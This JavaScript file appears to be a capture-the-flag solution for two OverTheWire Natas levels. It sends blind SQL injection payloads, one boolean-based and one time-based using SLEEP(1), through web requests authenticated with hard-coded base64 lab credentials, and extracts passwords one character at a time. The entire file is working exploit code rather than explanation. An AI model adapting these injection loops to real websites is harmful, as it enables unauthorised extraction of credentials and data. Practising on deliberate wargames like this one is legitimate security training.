import fetch from 'node-fetch';

async function sendRequestNatas15(query) {
  const response = await fetch("http://natas15.natas.labs.overthewire.org/index.php", {
    method: 'POST',
    headers: {
      "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: `username=${encodeURIComponent(query)}`
  });

  return await response.text();
}

async function sendRequestNatas17(query) {
  const start = Date.now();
  const response = await fetch("http://natas17.natas.labs.overthewire.org/index.php", {
    method: 'POST',
    headers: {
      "Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: `username=${encodeURIComponent(query)}`
  });

  const end = Date.now();
  response.timeTaken = end - start;
  return response;
}

const charRanges = [
  // numbers
  { start: 48, end: 58 },
  // capital letter
  { start: 65, end: 91 },
  // small letter
  { start: 97, end: 123 }
];

async function getPasswordNatas16() {
  let password = "";

  while (password.length < 32) {
    // check for each character range
    for (let range of charRanges) {
      for (let i = range.start; i < range.end; i++) {
        const char = String.fromCharCode(i);
        const query = `natas16" AND password LIKE BINARY "${password + char}%`;
        const r = await sendRequestNatas15(query);

        // check user for specific password
        if (r.includes("This user exists")) {
          password += char;
          console.log(password);
          break;
        }
      }
    }
  }

  return password;
}

async function getPasswordNatas18() {
  let password = "";

  while (password.length < 32) {
    // check for each character range
    for (let range of charRanges) {
      for (let i = range.start; i < range.end; i++) {
        const char = String.fromCharCode(i);
        const query = `natas18" AND password LIKE BINARY "${password + char}%" AND SLEEP(1)#`;
        const r = await sendRequestNatas17(query);

        // check user for specific password
        if (r.timeTaken > 1000) {
          password += char;
          console.log(password);
          break;
        }
      }
    }
  }

  return password;
}

getPasswordNatas16().then(password => {
  console.log("Password natas 16: ", password);
});


getPasswordNatas18().then(password => {
  console.log("Password natas 18: ", password);
});
